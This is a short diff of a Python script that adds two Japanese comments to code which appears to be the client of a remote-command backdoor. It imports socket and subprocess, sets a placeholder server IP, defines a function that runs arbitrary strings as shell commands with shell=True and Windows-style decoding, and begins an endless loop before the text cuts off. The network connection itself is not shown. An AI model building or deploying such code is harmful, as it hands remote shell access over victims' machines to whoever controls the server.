@@ -1,11 +1,14 @@
 import socket,time,subprocess,timeout_decorator
 IP = 'input server ip addr'
+
+#コマンド実行処理
 def command_execute(command):
     try:
         result = subprocess.check_output(command, shell=True)
         print(result.decode('shift-jis'))
         return result
     except:
+        #存在しないコマンド等であればerrorを返す。
         return b'error=1'
 while True:
     try:
